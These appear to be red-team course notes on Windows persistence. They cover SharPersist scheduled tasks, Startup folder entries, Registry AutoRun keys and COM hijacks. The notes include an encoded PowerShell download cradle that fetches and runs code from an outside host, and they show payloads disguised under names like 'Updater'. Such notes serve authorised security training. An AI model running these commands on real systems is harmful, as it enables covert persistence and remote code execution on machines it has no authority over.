# Host Persistence

No commands in CS, so need other tools like [SharPersist](https://github.com/fireeye/SharPersist). SharPersist has the parameters:
  * -t - desired persistence technique
  * -c - command
  * -a - any arguments for that command
  * -n - task name
  * -m add - adds the task (also remove, check and list)
  * -o - task frequency
  * For Startup Folder:
    * -f - filename to save command as
  * For Registry AutoRun:
    * -k - registry key to modify
    * -v - name of the registry key to create
  * 

## Task Scheduler

Allows a payload to execute on a trigger such as time of day, user logon, idle, when the computer is locked, or a combination. Good to base64 encode the command due to quotation confusion (it's Unicode encoding).

Examples:
* Linux shell:
  ```
  set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
  echo -en $str | iconv -t UTF-16LE | base64 -w 0```
* or PS:
  ```
  $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
  [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))```
* On beacon:
  ```execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <encoded command string>" -n "Updater" -m add -o hourly```

## Startup Folder
On beacon:
  ```execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <encoded command string>" -f "UserEnvSetup" -m add```

## Registry AutoRun

AutoRun values in HKCU and HKLM allow applications to start on boot. Commonly used for software updaters, download assistants, and driver utilities.

On beacon:
  ```
  cd C:\ProgramData
  upload C:\Payloads\http_x64.exe
  mv http_x64.exe updater.exe  // renames on Linux
  execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
  ```

## COM Hijacks

### Registry

[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) (in [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)) shows real-time file system, registry and process activity. It's useful for finding privilege escalation primitives. Practice locally or in a VM.
* Launch procmon64.exe on Attacker Desktop
* Filter for:
  * RegOpenKey operations
  * Where the Result is NAME NOT FOUND
  * Path ends with InprocServer32
* Look for CLSIDs that get loaded frequently, but not constantly (e.g. HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32)
* To see where it's loaded, in PS:
  ```
  Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
  Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
  ```
* If it shows that it exists in HKLM but not HKCU:
  ```
  New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
  New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
  New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
  ```
* When DllHost.exe loads the new COM entry, we get a beacon.
* Remove the registry entries from HKCU and delete the DLL to clean up.

### Task Scheduler

Many default Windows tasks use Custom Triggers to call COM objects. Look for tasks triggered when a user logs in. This gives effective reboot persistence. To find compatible tasks:
```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks) {
  if ($Task.Actions.ClassId -ne $null) {
    if ($Task.Triggers.Enabled -eq $true) {
      if ($Task.Principal.GroupId -eq "Users") {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
} } } }
```
1. Look the tasks up in Task Scheduler
2. ```Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"```
3. Do the HKLM/HKCU check above
4. Add a duplicate entry as above


